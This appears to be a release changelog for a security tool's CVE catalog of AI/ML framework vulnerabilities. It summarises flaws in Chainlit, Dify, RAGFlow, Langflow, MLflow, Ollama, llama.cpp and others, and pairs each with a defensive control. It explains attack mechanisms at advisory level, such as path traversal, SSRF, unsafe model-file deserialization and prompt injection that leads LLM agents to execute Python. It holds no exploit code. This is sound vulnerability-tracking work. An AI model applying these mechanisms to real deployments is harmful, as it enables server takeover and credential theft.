CVE catalog — Chainlit LLM-app framework. Adds two flaws in the `/project/element` update flow of Chainlit, a widely used open-source framework for conversational-AI / LLM apps. **CVE-2026-22218** (VulnCheck CNA CVSS v4.0 7.1; NVD v3.1 6.5) — a custom element with a caller-supplied `path` is copied into the requesting user's session without validation, so an authenticated client reads arbitrary files on the server host (CWE-22 path traversal); fixed in 2.9.4. Reuses the AI-runtime-API path-traversal validation control (NEW-CTRL-094) shared with the AnythingLLM upload traversal. **CVE-2026-22219** (VulnCheck CNA CVSS v4.0 8.3; NVD v3.1 7.7, scope-changed) — with the SQLAlchemy data-layer backend, a custom element's `url` is fetched server-side and the response stored, so an authenticated client reaches internal services or cloud metadata (CWE-918 SSRF); fixed in 2.9.4. Reuses the AI-data-pipeline import SSRF control (NEW-CTRL-105) shared with the Dify, RAGFlow, and Label Studio data-pipeline SSRFs. CVE count 408 → 410.

## 0.13.118 — 2026-05-26

The researcher-handle tracker behind `refresh --check-advisories` (NEW-CTRL-073) now follows the Nightmare-Eclipse handle on its GitLab public-activity Atom feed instead of the GitHub events API — the handle's GitHub account was removed. The feed count is unchanged and the diff shape is identical: GitLab tag pushes and newly created public projects surface as `researcher-handle-drop` diffs exactly as the GitHub events did, carrying the same `researcher_handle` field. The NEW-CTRL-073 control text is now platform-agnostic (GitHub events or a GitLab activity feed).

`exceptd --help` is clearer. A Quick start block at the top shows the three commands most workflows begin with — `discover` to see what applies, `brief` to read what a playbook checks, `run` to investigate — plus the plain-language `ask` entry point for when you don't know which playbook fits. The legacy-verb section now separates the five removed verbs (`plan`, `govern`, `direct`, `look`, `ingest` — which error with a pointer to their replacement) from the deprecated aliases that still work, so the help no longer implies a removed verb is available.

## 0.13.117 — 2026-05-26

CVE catalog — RAGFlow RAG-engine. Adds two flaws in RAGFlow (infiniflow/ragflow), a widely deployed open-source Retrieval-Augmented-Generation engine. **CVE-2024-12450** (NVD CVSS 9.8 CRITICAL; huntr CNA 6.5) — the `web_crawl` function does not filter the supplied URL, yielding full-read SSRF against internal addresses, arbitrary local file read via `file://`, and potential remote code execution through an outdated headless Chromium run with the sandbox disabled; fixed in 0.14.0. Reuses the AI-data-pipeline import SSRF control (NEW-CTRL-105) shared with the Dify `RemoteFileUploadApi` and Label Studio data-pipeline SSRFs. **CVE-2025-69286** (GitHub CNA CVSS v4.0 8.9; NVD v3.1 9.8) — the API key and the assistant/agent share token are generated with the same serializer keyed by the tenant id over a timestamp-based UUIDv1, so the two tokens are mutually derivable; an attacker who obtains a shared assistant/agent link derives the owner's personal API key and takes full control of the account (CWE-340); fixed in 0.22.0. Introduces NEW-CTRL-109: an AI app's API keys and share tokens must be generated from a CSPRNG with an unpredictable per-install secret — never derivable from a tenant id, a timestamp, or another token. Adds CWE-340 (Generation of Predictable Numbers or Identifiers) to the CWE catalog. CVE count 406 → 408.

## 0.13.116 — 2026-05-26

Documentation. The README pinned the CVE catalog's size to a v0.13.17 milestone ("68 to 312 entries"), which read as the current count even though the catalog has since grown past 400. Reworded to state current scale while keeping the v0.13.17 KEV-intake milestone, phrased so it no longer drifts as the catalog grows.

## 0.13.115 — 2026-05-26

CVE catalog — Dify object-level authorization bypass. Adds two flaws in Dify where an API trusts a user-controlled key without an ownership check (CWE-639). **CVE-2026-41947** (VulnCheck CNA CVSS 9.1 CRITICAL / v4.0 9.3) — the trace-configuration endpoints miss tenant-ownership checks, so an authenticated editor configures trace settings for any application and can redirect victim trace data to an attacker-controlled provider; fixed in 1.14.2. **CVE-2026-41950** (VulnCheck CNA CVSS 6.5 MEDIUM) — the chat-messages endpoint accepts an arbitrary file UUID in the files array without verifying ownership, so an authenticated user reads files uploaded by other users in the same tenant; fixed in 1.14.0. Both are patched and reuse the AI-app API object-authorization control (NEW-CTRL-106) shared with the Label Studio privilege-escalation chain — an LLM app platform must enforce object-level authorization on every request that references an object by a caller-supplied id. CVE count 404 → 406.

## 0.13.114 — 2026-05-26

CVE catalog — Dify password-recovery account takeover. Adds two flaws in Dify's password-reset flow, both yielding takeover of any account including administrators (CWE-640 weak password-recovery mechanism). **CVE-2025-1796** (CWE-338 / CWE-640, NVD CVSS 8.8 HIGH; huntr CNA 7.5) — reset codes are generated with a weak pseudo-random number generator (`random.randint`), so an attacker predicts the code and resets any account. **CVE-2024-12776** (CWE-287 / CWE-640, huntr CNA CVSS 8.1 HIGH; NVD classifies it CWE-305) — the `/forgot-password/resets` endpoint does not verify the reset code before allowing a reset. Neither has a fixed version published, so mitigation is generating reset tokens with a CSPRNG and verifying them server-side. Both introduce NEW-CTRL-108: an AI app's password-recovery flow must use cryptographically secure, single-use, short-lived reset tokens and verify them server-side before any reset. CVE count 402 → 404.

## 0.13.113 — 2026-05-26

CVE catalog — Dify LLM app-platform. Adds two flaws in Dify, the low-code LLM application-development platform. **CVE-2025-3466** (CWE-94 / CWE-693, NVD CVSS 7.2 HIGH; huntr CNA 9.8 CRITICAL) — the code node runs user-supplied code in a sandbox, but unsanitized input lets an attacker override global functions (e.g. `parseInt`) before the sandbox restrictions are applied, escaping the sandbox and executing code with root-level access; fixed in 1.1.3. (NVD classifies it CWE-1100; the catalog maps that to the catalogued CWE-94 + CWE-693.) **CVE-2025-56520** (CWE-918, CISA-ADP CVSS 5.3 MEDIUM) — the `RemoteFileUploadApi` fetches a user-supplied URL without validating the destination, so an unauthenticated attacker reaches internal services or cloud metadata via the server; no fixed version is published, so mitigation is destination allowlisting and network isolation. The code-node RCE reuses the LLM-app-builder execution control (NEW-CTRL-103) — an app builder must initialize its sandbox before evaluating user input — and the SSRF reuses the data-pipeline SSRF control (NEW-CTRL-105). CVE count 400 → 402.

## 0.13.112 — 2026-05-26

CVE catalog — Kubeflow MLOps-console cross-site scripting. Adds two XSS flaws in Kubeflow, the MLOps orchestration console, where user-controlled fields are rendered without neutralization (CWE-79). **CVE-2024-9526** (NVD CVSS 5.4 MEDIUM; Google CNA CVSS v4.0 7.1) — the Pipeline View renders the pipeline description field without filtering HTML, so attacker-stored markup runs in the browser of every operator who views the pipeline; fixed upstream. **CVE-2023-6571** (NVD CVSS 6.1 MEDIUM) — Kubeflow reflects attacker-controlled input into a page without neutralization, so a crafted link runs script in the victim's authenticated session; fixed upstream. Both are patched and introduce NEW-CTRL-107: an MLOps console is a multi-user trust boundary — HTML-encode every user-controlled field it renders, never render description/metadata as raw HTML, set a strict Content-Security-Policy, and mark session cookies HttpOnly, so stored or reflected markup cannot hijack operators' sessions. CVE count 398 → 400.

## 0.13.110 — 2026-05-26

CVE catalog — Adversarial Robustness Toolbox (ART) code execution. Adds two flaws in ART, the Trusted-AI library used to *defend* ML models against adversarial attacks, both in its Kubeflow component (CISA-ADP CVSS 9.8 CRITICAL; NVD assessment pending). **CVE-2026-31229** (CWE-502) — the model loader calls `torch.load()` without `weights_only=True`, so loading a maliciously crafted model file runs arbitrary code (the same safe-load gap as CVE-2025-32434, here in the defensive library). **CVE-2026-31230** (CWE-88) — the `--clip_values` and `--input_shape` command-line arguments are parsed through an unsafe dynamic-evaluation call, so attacker-controlled values execute arbitrary Python. Both affect ART through 1.20.1 with no published fix, so both are scored without patch credit; CVE-2026-31229 reuses the untrusted-model-artifact control (NEW-CTRL-091) — a model file is executable code — and CVE-2026-31230 reuses the AI-framework CLI input-neutralization control (NEW-CTRL-100), parse argument values with a safe literal parser. CVE count 396 → 398.

## 0.13.109 — 2026-05-26

CVE catalog — Label Studio privilege-escalation chain. Adds the two flaws that chain into full account takeover of Label Studio, the data-labeling platform used in ML pipelines, both sensitive-information exposure (CWE-200). **CVE-2023-47117** (NVD/GitHub CNA CVSS 7.5 HIGH) — the task-filter feature passes user input into a Django ORM query without restricting referenced fields, leaking password hashes and tokens from all accounts; fixed in 1.9.2post0. **CVE-2023-43791** (NVD CVSS 8.8 HIGH; GitHub CNA 9.8 CRITICAL) — exposed information, chained with that ORM leak, lets an attacker impersonate any account and escalate from a low-privilege user to a Django super administrator; fixed in 1.8.2. Both are patched and introduce NEW-CTRL-106: an ML data-platform API must enforce object-level authorization on every read and never expose secrets, tokens, or password hashes through serializers or user-controlled filters — use field allowlists, scope queries to the caller, and store credentials so a read leak is not directly replayable. CVE count 394 → 396.

## 0.13.108 — 2026-05-26

CVE catalog — Label Studio data-pipeline SSRF. Adds two server-side request forgery flaws in Label Studio, the data-labeling / annotation platform used in ML pipelines, where the server fetches caller-supplied URLs without validating the destination. **CVE-2025-25297** (CWE-918, NVD CVSS 7.7 HIGH; GitHub CNA 8.6) — the S3 storage feature accepts a custom endpoint URL without validation, so an attacker reaches internal services or cloud metadata via the server; fixed in 1.16.0. **CVE-2022-36551** (CWE-918, NIST CVSS 6.5 MEDIUM) — the Data Import module fetches a user-supplied URL with no restriction and self-registration is on by default, so any remote attacker reads arbitrary files or reaches internal services; fixed in 1.6.0. Both are patched and introduce NEW-CTRL-105: an ML data-pipeline platform's import/storage URL fetches must validate and allowlist destinations (block private, link-local, and cloud-metadata addresses and `file://` schemes) and restrict who can configure them. CVE count 392 → 394.

## 0.13.107 — 2026-05-26

CVE catalog — MLflow model-artifact deserialization (a model is executable code). Adds two of the Protect AI / HiddenLayer MLflow model-flavor deserialization flaws, where loading a stored artifact runs arbitrary code. **CVE-2024-37052** (CWE-502, HiddenLayer CNA CVSS 8.8 HIGH; NVD unscored) — a maliciously crafted scikit-learn model in MLflow runs code when a user loads it. **CVE-2024-37060** (CWE-502, HiddenLayer CNA CVSS 8.8 HIGH; NVD unscored) — a maliciously crafted MLflow Recipe runs code when executed. Both affect MLflow up to 2.14.1 and have no patched version — loading an untrusted model artifact is inherently code execution — so they are scored without patch credit and the control is provenance verification plus sandboxed loading. Both map MITRE ATLAS AML.T0011.000 (unsafe AI artifacts) and ATT&CK T1204, and reuse the untrusted-model-artifact control (NEW-CTRL-091) shared with the Keras / Hugging Face / NeMo / PyTorch / H2O entries — a model artifact is executable code regardless of platform. CVE count 390 → 392.

## 0.13.106 — 2026-05-26

CVE catalog — BentoML model-serving deserialization RCE (recurring class). Adds two unauthenticated insecure-deserialization flaws in BentoML, the model-serving / inference framework, where the serving path reconstructs an attacker-supplied serialized object without validation. **CVE-2024-2912** (CWE-1188, huntr.dev CNA CVSS 10.0 CRITICAL; NVD unscored) — BentoML before 1.2.5 deserializes a malicious object delivered to a valid serving endpoint, giving unauthenticated remote code execution; fixed in 1.2.5. **CVE-2025-27520** (CWE-502, GitHub CNA CVSS 9.8 CRITICAL; NVD unscored) — the deserialization routine in `serde.py` reconstructs an attacker-supplied object from a request, so any unauthenticated user runs code on the server; fixed in 1.4.3, the same class recurring after the 1.2.5 fix. Both are patched (scored with patch credit) and reuse the inference/serving deserialization-safety control (NEW-CTRL-086) shared with the ShadowMQ / vLLM inference-deserialization entries — a model server must never reconstruct an untrusted serialized object from a request. Upgrade BentoML to 1.4.3 or later. CVE count 388 → 390.

## 0.13.105 — 2026-05-26

CVE catalog — H2O-3 ML platform unauthenticated control plane. Adds two huntr.dev / Protect AI flaws in H2O-3, the open-source ML/AutoML platform, both reachable without authentication. **CVE-2023-6016** (CWE-94, NVD CVSS 9.8 CRITICAL; huntr CNA 10.0) — the dashboard's POJO (Java) model-import feature compiles and runs the imported model code with no authentication, so importing a malicious model gives remote code execution. **CVE-2023-6038** (CWE-862, NVD CVSS 7.5 HIGH; huntr CNA 9.3) — the REST API's file-import path performs no authorization check, letting an unauthenticated attacker read arbitrary files on the host. H2O.ai documents H2O-3 as a trusted-environment product and ships no fix, so both are scored without patch credit and the only remediation is network isolation plus authenticated access control. CVE-2023-6016 reuses the untrusted-model-artifact control (NEW-CTRL-091) — a POJO model is executable code, the same class as the Keras / Hugging Face / NeMo / PyTorch entries — and CVE-2023-6038 reuses the AI-compute control-plane authentication control (NEW-CTRL-088) shared with the Ray entries. CVE count 386 → 388.

## 0.13.104 — 2026-05-26

CVE catalog — ClearML MLOps platform artifact trust. Adds two flaws in ClearML, the MLOps / experiment-tracking platform, where the client SDK mishandles content other collaborators uploaded (HiddenLayer disclosure). **CVE-2024-24590** (CWE-502, NVD CVSS 8.8 HIGH; HiddenLayer CNA 8.0) — the SDK reconstructs a stored artifact through an unsafe object-deserialization path on retrieval, so a maliciously uploaded artifact runs code on the retrieving user's system. **CVE-2024-24591** (CWE-22, NVD CVSS 8.8 HIGH; HiddenLayer CNA 8.0) — the SDK writes dataset entries without path containment, so a malicious dataset writes files to arbitrary locations (escalating to code execution by overwriting startup files). Neither has a fixed SDK version published in the advisory, so both are scored without patch credit and remediation is to retrieve artifacts/datasets only from trusted projects. Both map MITRE ATLAS AML.T0010 and ATT&CK T1204, and introduce NEW-CTRL-104: an MLOps platform must treat every uploaded artifact and dataset as untrusted — never auto-deserialize through an unsafe loader, and contain dataset extraction paths. CVE count 384 → 386.

## 0.13.103 — 2026-05-26

CVE catalog — the same Langflow unauthenticated-RCE class, CISA KEV-listed on two different endpoints. Adds two unauthenticated remote-code-execution flaws in Langflow, the visual LLM app/agent builder, where a flow endpoint reaches a code-execution path without authentication — both actively exploited and in the CISA KEV catalog. **CVE-2025-3248** (CWE-94 / CWE-306, VulnCheck CNA CVSS 9.8 CRITICAL; KEV added 2025-05-05) — the `/api/v1/validate/code` endpoint runs attacker-supplied Python with no authentication. **CVE-2026-33017** (CWE-94 / CWE-95 / CWE-306, NVD CVSS 9.8; GitHub CNA CVSS v4.0 9.3; KEV added 2026-03-25) — after the first fix shipped in 1.3.0, the public flow-build endpoint still ran flow-supplied Python through an unsandboxed dynamic-evaluation path, so the same code-injection class was exploited and KEV-listed a second time; fixed in 1.9.0. Both score P1 (patch within 24h) under RWEP. They introduce NEW-CTRL-103: every LLM-app-builder flow validate/build/run endpoint must authenticate and sandbox submitted code, and a fix must cover the whole class of endpoints rather than the single reported route — the first Langflow fix closed one route but not the class. Upgrade Langflow to 1.9.0 or later. CVE count 383 → 384.

## 0.13.102 — 2026-05-25

CVE catalog — prompt injection to code execution in natural-language data-analysis agents. Adds two flaws in agents whose purpose is to turn a natural-language question into code that the framework then runs, so prompt injection is the exploit primitive. **CVE-2024-5565** (Vanna.AI, CWE-94 / CWE-77, JFrog CNA CVSS 8.1 HIGH; GitHub advisory 9.2; NVD unscored) — the text-to-SQL `ask` method runs LLM-generated Python to build a Plotly visualization (default-on), so an injected question executes arbitrary Python on the host. **CVE-2024-12366** (PandasAI, CWE-94, CISA-ADP CVSS 9.8 CRITICAL; NVD unscored) — the `chat` interface runs LLM-generated Python against DataFrames without separating analytical input from injected instructions, giving unauthenticated RCE / sandbox escape. Neither has a fixed release, so both are scored without patch credit and remediation is sandboxing the code-execution path; both map MITRE ATLAS AML.T0051 (LLM Prompt Injection) and ATT&CK T1059.006, and introduce a control (NEW-CTRL-102) requiring NL-to-code/SQL agents to treat the question and analyzed data as untrusted and never run model-generated code with host privileges. CVE count 381 → 383.

## 0.13.101 — 2026-05-25

CVE catalog — vector-database RCE and backup path traversal. Adds two more flaws in the RAG persistence layer. **CVE-2026-45829** (ChromaDB "ChromaToast", CWE-94, CNA CVSS v4.0 10.0 CRITICAL; NVD unscored) — ChromaDB's Python FastAPI server processes a caller-supplied embedding-function config (a model repo with `trust_remote_code=true`) on the collections endpoint *before* authenticating, giving unauthenticated remote code execution; no fixed Python release is published, so mitigation is network isolation, the Rust `chroma run` / official Docker deployment, and disabling remote model loading. **CVE-2025-67818** (Weaviate, CWE-22, NIST CVSS 7.2) — backup restore does not constrain entry paths, so a write-capable attacker uses absolute / `../` paths (ZipSlip) to create or overwrite arbitrary host files; fixed in 1.33.4. Both map MITRE ATLAS AML.T0049 and ATT&CK T1190; ChromaDB reuses the vector-DB authentication control (NEW-CTRL-101) shared with Milvus, and Weaviate reuses the path-traversal control (NEW-CTRL-094) shared with the Ollama / AnythingLLM entries. The unpatched pre-auth RCE scores well above the patched path-traversal flaw under RWEP. CVE count 379 → 381.

## 0.13.100 — 2026-05-25

CVE catalog — PyTorch torch.load RCE despite weights_only=True. Adds **CVE-2025-32434** (CWE-502, NIST CVSS 9.8 CRITICAL): PyTorch's `torch.load` executes attacker code from a crafted checkpoint even when called with `weights_only=True` — the setting the ecosystem recommended as the safe way to load untrusted models — so pipelines that followed that guidance on ≤ 2.5.1 remain vulnerable; fixed in 2.6.0. Maps MITRE ATLAS AML.T0010 / AML.T0011 / AML.T0011.000 and ATT&CK T1204 / T1059 / T1195.002, and reuses the untrusted-model-artifact control (NEW-CTRL-091) shared with the Keras, Hugging Face Transformers, and NeMo entries — a model checkpoint is executable code regardless of "safe" load flags. CVE count 378 → 379.

## 0.13.99 — 2026-05-25

CVE catalog — NVIDIA NeMo model-load code execution. Adds two flaws in NeMo, NVIDIA's LLM training/customization framework, both where loading an untrusted model executes code. **CVE-2025-33236** (CWE-94, CNA NVIDIA CVSS 7.8; NVD unscored) — importing a malicious AI model triggers code injection and NeMo silently runs attacker code; fixed in 2.6.1 (Cato CTRL research). **CVE-2024-0129** (CWE-22, NIST CVSS 7.8 / NVIDIA 6.3) — the SaveRestoreConnector extracts a `.nemo` (`.tar`) model archive without path restriction, so a malicious model writes to an arbitrary path and can execute code; fixed in r2.0.0rc0. Both map MITRE ATLAS AML.T0010 / AML.T0011 / AML.T0011.000 and ATT&CK T1204 / T1059 / T1195.002, and reuse the untrusted-model-artifact control (NEW-CTRL-091) shared with the Keras and Hugging Face Transformers entries — a model file is executable code, so untrusted models must be provenance-verified and sandboxed. CVE count 376 → 378.

## 0.13.98 — 2026-05-25

CVE catalog — Anyscale Ray dashboard. Adds the Ray dashboard CVE pair (fixed in Ray 2.8.1), complementing the disputed ShadowRay Job-API entry. **CVE-2023-6019** (CWE-78, NIST CVSS 9.8) — the dashboard's `cpu_profile` URL parameter is injected into a system command, giving unauthenticated remote code execution on the dashboard host. **CVE-2023-6021** (CWE-22, NIST CVSS 7.5) — the dashboard log API allows path traversal to read any file on the host without authentication. Both map ATLAS AML.T0049 and ATT&CK T1190 (+ T1059 / T1083), and reuse the AI-compute control-plane authentication control (NEW-CTRL-088) shared with ShadowRay — the AI compute dashboard/control plane must authenticate every caller and never be network-exposed. Unlike the disputed ShadowRay Job-API issue, these were patched in 2.8.1. CVE count 374 → 376.

## 0.13.97 — 2026-05-25

CVE catalog — Milvus vector-database authentication bypass. Adds the vector-DB / RAG-persistence surface with two Milvus auth-bypass flaws. **CVE-2025-64513** (CWE-287, CNA GitHub CVSS v4.0 9.3; NVD unscored) — the Milvus Proxy trusts forged HTTP headers, letting an unauthenticated attacker bypass all authentication; fixed in 2.4.24 / 2.5.21 / 2.6.5. **CVE-2026-26190** (CWE-306, NIST CVSS 9.8) — TCP port 9091 is exposed with weak default tokens and unauthenticated API access, enabling arbitrary expression evaluation and full unauthenticated control; fixed in 2.5.27 / 2.6.10. Both map ATLAS AML.T0049 / AML.T0035 and ATT&CK T1190 (+ T1078 / T1059), with a zero-day lesson (NEW-CTRL-101) treating the vector database as a sensitive RAG data store whose every API/management port (including metrics ports) must authenticate, with default tokens replaced and no untrusted-network exposure. CVE count 372 → 374.

## 0.13.96 — 2026-05-25

CVE catalog — BerriAI LiteLLM gateway. Adds two flaws in the LLM proxy/gateway that concentrates provider API keys. **CVE-2024-6587** (CWE-918, NIST CVSS 7.5) — LiteLLM honors a user-supplied `api_base` on `/chat/completions` and forwards the configured provider API key to the attacker's domain (SSRF → key interception); this was the SSRF link of a Pwn2Own full-chain RCE. **CVE-2024-4889** (CWE-94, NIST CVSS 7.2) — an admin-influenced `UI_LOGO_PATH` with Google KMS / `SAVE_CONFIG_TO_DB` reaches a dynamic-evaluation path in the secret-management code, executing code on the credential-bearing proxy; fixed in 1.44.16. Both map ATLAS AML.T0049 + AML.T0055 (unsecured credentials) and ATT&CK T1190 (+ T1552.001 / T1059), and reuse the gateway-credential-isolation control (NEW-CTRL-013) shared with the LiteLLM SQLi entry — the LLM gateway is a high-value credential store whose request/config plane must be isolated from the secrets. CVE count 370 → 372.

## 0.13.95 — 2026-05-25

CVE catalog — LlamaIndex CLI command injection. Adds **CVE-2025-1753** (CWE-78, CNA huntr.dev CVSS 7.8; NVD has not assigned its own score): the LlamaIndex CLI builds a shell command from the user-supplied `--files` argument and runs it without neutralization, so shell metacharacters execute arbitrary OS commands; the fix adds shlex escaping. Maps ATT&CK T1059, with a zero-day lesson (NEW-CTRL-100) requiring AI-framework CLIs/tools to use argv-array execution or shlex neutralization rather than building shell strings from arguments — the same root cause as the MCP-stdio command-injection family, applied to a framework CLI. CVE count 369 → 370.

## 0.13.94 — 2026-05-25

CVE catalog — AnythingLLM upload path traversal to RCE. Adds **CVE-2024-13059** (CWE-22, NIST CVSS 7.2): AnythingLLM's multer-based upload handler mishandles non-ASCII filenames so they decode into `../` traversal sequences, letting a manager/admin user write attacker content to an arbitrary path (e.g. a startup script) and achieve remote code execution on the host; fixed in 1.3.1. Maps ATLAS AML.T0049 and ATT&CK T1190 / T1059, and reuses the runtime-API path-traversal control (NEW-CTRL-094) shared with the Ollama entries — AI-app file/path inputs must be canonicalized and validated, including non-ASCII transforms, before touching the filesystem. CVE count 368 → 369.

## 0.13.93 — 2026-05-25

CVE catalog — LangChain experimental-chain code execution (prompt injection to RCE). Adds the canonical class where an LLM chain turns prompt-influenced input into executed Python. **CVE-2024-21513** (langchain-experimental, CWE-94, NIST CVSS 8.5) — VectorSQLDatabaseChain evaluates database values as code, so an attacker controlling the input prompt achieves arbitrary code execution; fixed in 0.0.21. **CVE-2023-44467** (langchain_experimental PALChain, CWE-94, NIST CVSS 9.8) — PALChain executes prompt-generated Python and did not block the dunder-import builtin, bypassing the earlier CVE-2023-36258 fix; fixed in 0.0.306. Both map ATLAS AML.T0051 (LLM prompt injection) + AML.T0011 and ATT&CK T1059 / T1059.006, and their shared zero-day lesson (NEW-CTRL-099) requires chains that execute generated code to sandbox or disable it — builtin denylists are an incomplete fix. Distinct from the existing LangChain entries (LangGrinch serialization, Chatchat MCP). CVE count 366 → 368.

## 0.13.92 — 2026-05-25

CVE catalog — ComfyUI custom-node RCE. Adds the two Snyk-disclosed flaws in the ComfyUI custom-node ecosystem, the AI image-generation tool whose nodes auto-load and run code. **CVE-2024-21575** (ComfyUI-Impact-Pack, CWE-35, NIST CVSS 8.6) — missing validation of `image.filename` on `/upload/temp` allows path-traversal arbitrary file write; dropping a `.py` into the auto-loaded `./custom_nodes` directory escalates to remote code execution. **CVE-2024-21576** (ComfyUI-Bmad-Nodes, CWE-94, NIST CVSS 10.0) — several nodes pass a workflow-supplied string to a dynamic-code-evaluation call, so a crafted workflow yields unauthenticated RCE. Both map ATLAS AML.T0049 and ATT&CK T1190 / T1059; their shared zero-day lesson (NEW-CTRL-098) treats auto-loaded AI-tool custom nodes as an untrusted-code supply-chain and execution surface (allow-list before install, validate node inputs, never expose the tool to untrusted networks). The entries note the April 2026 cryptomining-botnet campaign mass-targeting exposed ComfyUI via this surface, without attributing it to these specific CVEs. CVE count 364 → 366.

## 0.13.91 — 2026-05-25

CVE catalog — MLflow recipe template-injection XSS. Adds **CVE-2024-27132** (CWE-79, NIST CVSS 9.6 CRITICAL): MLflow renders recipe template variables without sufficient sanitization, so running an untrusted recipe executes script in the victim's MLflow session (stored XSS) and pivots to client-side remote code execution against the tracking-server UI; fixed in 2.10.0. Maps ATLAS AML.T0049 and ATT&CK T1189 / T1059.007, with a zero-day lesson (NEW-CTRL-097) requiring the MLOps platform UI to output-encode all user/community-supplied content it renders (recipe variables, run metadata, model cards) and stay off untrusted networks. Complements the existing MLflow path-traversal entry (CVE-2023-43472). CVE count 363 → 364.

## 0.13.90 — 2026-05-25

CVE catalog — vLLM distributed-serving ZeroMQ transport. Adds two flaws in vLLM's multi-node serving transport, both fixed in 0.8.5. **CVE-2025-32444** (CWE-502, NIST CVSS 9.8) — the Mooncake KV-transfer integration exchanges serialized data over unsecured ZeroMQ sockets, giving an unauthenticated network attacker remote code execution; unlike the off-by-default V0-engine ShadowMQ flaw, the Mooncake sockets are network-reachable when the integration is enabled. **CVE-2025-30202** (CWE-770, NIST CVSS 7.5) — multi-node deployments bind the primary host's XPUB ZeroMQ socket to all interfaces, exposing the broadcast data stream and enabling denial of service. Both map ATLAS AML.T0049 and ATT&CK T1190 (+ T1059 / T1499 / T1040), and they reuse the inference-IPC deserialization-safety control (NEW-CTRL-086) shared with the ShadowMQ family — a safe serializer, peer authentication, and loopback/trusted-segment binding across every inference engine. CVE count 361 → 363.

## 0.13.89 — 2026-05-25

CVE catalog — NVIDIA Triton DALI backend memory safety. Completes the May 2026 Triton bulletin coverage with the three DALI (data-augmentation) backend flaws disclosed by researcher Navtej Kathuria, all fixed in r26.03: **CVE-2026-24213** (CWE-125 out-of-bounds read, NIST CVSS 9.8), **CVE-2026-24214** (CWE-190 integer overflow, NIST CVSS 9.8), and **CVE-2026-24215** (CWE-400 uncontrolled resource consumption / DoS, NIST CVSS 7.5). All process attacker-supplied inference input on a network-reachable backend. These are deliberate CVSS-versus-RWEP cases: NVD rates two of them CRITICAL, but with no CISA KEV listing, no confirmed in-the-wild exploitation, no public proof-of-concept, and a patch available, the Real-World Exploit Priority is P4 — the catalog scores priority on exploitation reality, not CVSS alone. Their shared zero-day lesson (NEW-CTRL-096) requires inference backends to bound and validate untrusted input size/shape and enforce resource limits, with the inference endpoint off untrusted networks. CVE count 358 → 361.

## 0.13.88 — 2026-05-25

CVE catalog — Hugging Face Transformers model-loader deserialization RCE. Adds the three ZDI-coordinated deserialization flaws in the foundational ML library's model loaders, all CWE-502 and fixed in 4.48.0: **CVE-2024-11392** (MobileViTV2 configuration files), **CVE-2024-11393** (MaskFormer model files), and **CVE-2024-11394** (Trax model files), each NIST CVSS 8.8 — loading a malicious model/config of the affected type executes attacker code in the user's process. All map MITRE ATLAS AML.T0010 / AML.T0011 / AML.T0011.000 and ATT&CK T1204 / T1059 / T1195.002, and they reuse the existing untrusted-model-artifact control (NEW-CTRL-091) — the same control that closes the Keras model-deserialization CVEs, because the class is "a model file is executable code", not a single loader. CVE count 355 → 358.

## 0.13.87 — 2026-05-25

CVE catalog — Gradio file-access (Hugging Face Spaces secret theft). Adds the two Horizon3.ai-disclosed file-read flaws in Gradio, the ML demo/UI framework behind Hugging Face Spaces and countless public ML demos. **CVE-2024-1561** (CWE-22, NIST CVSS 7.5) — the `/component_server` endpoint invokes arbitrary Component methods with attacker-controlled arguments, abused via `move_resource_to_block_cache()` to read host files (and steal HF Spaces secrets); fixed in 4.13.0. **CVE-2023-51449** (CWE-22 + SSRF, NIST CVSS 7.5) — the `/file` route's directory-containment check was flawed, allowing arbitrary file read (and full-read SSRF) on a publicly reachable app; fixed in 4.11.0. Both map MITRE ATLAS AML.T0049 + AML.T0055 (unsecured credentials) and ATT&CK T1190 / T1083 / T1005; their shared zero-day lesson (NEW-CTRL-095) requires the framework's file-serving routes to enforce directory containment, not expose arbitrary method invocation or SSRF, and keep secret-bearing apps off untrusted networks. CVE count 353 → 355.

## 0.13.86 — 2026-05-25

CVE catalog — Ollama API path traversal. Adds the two path-traversal flaws in Ollama, the most widely used local LLM runtime. **CVE-2024-37032** (Wiz "Probllama", CWE-22, NIST CVSS 8.8) — Ollama does not validate that a model-blob digest is a 64-character hex SHA256, so a manifest from a rogue registry embeds traversal sequences that make a model pull write attacker content to an arbitrary path, achieving remote code execution; fixed in 0.1.34. **CVE-2024-39722** (Oligo "More Models, More ProbLLMs", CWE-22, NIST CVSS 7.5) — the api/push route discloses host file existence via path traversal to an unauthenticated caller; fixed in 0.1.46. Both map ATLAS AML.T0049 (+ AML.T0010 for the rogue-registry RCE) and ATT&CK T1190 (+ T1059 / T1083); their shared zero-day lesson (NEW-CTRL-094) requires the runtime API to validate digests and path parameters before filesystem access, stay off untrusted networks, and pull only from trusted registries. CVE count 351 → 353.

## 0.13.85 — 2026-05-25

CVE catalog — ShellTorch (PyTorch TorchServe model-server takeover). Adds the Oligo-disclosed chain that took over thousands of exposed TorchServe instances, including at major organizations. **CVE-2023-43654** (CWE-918, NIST CVSS 9.8) — the TorchServe management API registers a model from any remote URL (SSRF), and because the management console binds to all interfaces by default with no authentication, this is unauthenticated remote code execution; fixed in 0.8.2. **CVE-2022-1471** (CWE-502/20, NIST CVSS 9.8, CNA 8.3) — the deserialization leg: SnakeYAML's default `Constructor` instantiates arbitrary types from untrusted YAML, so the model config TorchServe parses becomes code execution; fixed in SnakeYAML 2.0 (SafeConstructor default). Both map MITRE ATLAS (AML.T0049 / AML.T0010 / AML.T0011.000) and ATT&CK T1190 / T1059, and their shared zero-day lesson (NEW-CTRL-093) requires the model-server management API to authenticate, bind to loopback, allow-list model sources, and parse config with safe deserializers. CVE count 349 → 351.

## 0.13.84 — 2026-05-25

CVE catalog — llama.cpp RPC-backend memory-safety RCE. Adds the unauthenticated remote-memory-corruption family in the RPC backend of the most widely used local LLM runtime, all reachable over the RPC server's default port 50052 with no authentication. **CVE-2024-42479** (CWE-787/123, NIST CVSS 9.8) — a SET_TENSOR message with an unvalidated `rpc_tensor` data pointer yields a write-what-where primitive and RCE. **CVE-2024-42478** (CWE-125, NIST CVSS 9.8) — the companion GET_TENSOR arbitrary-address read for pointer leaks / ASLR bypass. Both fixed in build b3561. **CVE-2026-34159** (CWE-119, NIST CVSS 9.8) — `deserialize_tensor()` still skips bounds validation when a tensor's `buffer` field is 0 via the GRAPH_COMPUTE command path that the b3561 fix never covered, giving unauthenticated RCE; fixed in b8492. All three map ATLAS AML.T0049 and ATT&CK T1190 (+ T1059 for the code-execution variants); their shared zero-day lesson (NEW-CTRL-092) requires bounds validation inside `deserialize_tensor` across every command path and keeping the RPC server off untrusted networks. CVE count 346 → 349.

## 0.13.83 — 2026-05-25

